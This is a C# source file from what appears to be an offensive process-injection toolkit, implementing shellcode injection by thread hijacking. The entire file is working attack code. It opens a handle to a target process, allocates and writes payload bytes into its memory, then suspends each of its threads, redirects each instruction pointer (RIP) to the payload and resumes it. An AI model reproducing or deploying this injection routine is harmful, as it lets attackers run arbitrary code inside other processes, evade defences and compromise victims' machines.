using PIF.Misc;
using System;
using System.Collections.Generic;

namespace PIF.Inject.SC {
    internal class ThreadHijacking {
        public static void Invoke(Init pif) {
            Output.Write("Opening a handle to the target process");
            IntPtr hProcess = Helpers.GetProcessHandle(pif);
            if (hProcess == IntPtr.Zero) {
                PIFException.Throw("Failed to open handle.");
            }

            Output.Write("Allocating new buffer and writing payload into the target process");
            if (!Helpers.AllocAndWriteMemory(hProcess, pif.payloadBytes, out IntPtr hBuffer)) {
                PIFException.Throw($"Failed to {(hBuffer == IntPtr.Zero ? "allocate memory in" : "write to")} target process.");
            }

            Output.Write("Getting all process threads");
            List<IntPtr> hThreads = Helpers.GetProcessThreads(PInvoke.GetProcessId(hProcess));
            foreach (IntPtr thread in hThreads) {
                Output.Write($"Updating Thread context => 0x{thread.ToInt64():X8}");
                PInvoke.SuspendThread(thread);
                PInvoke.CONTEXT ctx = new PInvoke.CONTEXT { ContextFlags = PInvoke.CONTEXT_ALL };
                PInvoke.GetThreadContext(thread, ref ctx);
                ctx.Rip = (ulong)hBuffer;
                PInvoke.SetThreadContext(thread, ref ctx);
                PInvoke.ResumeThread(thread);
            }
        }
    }
}
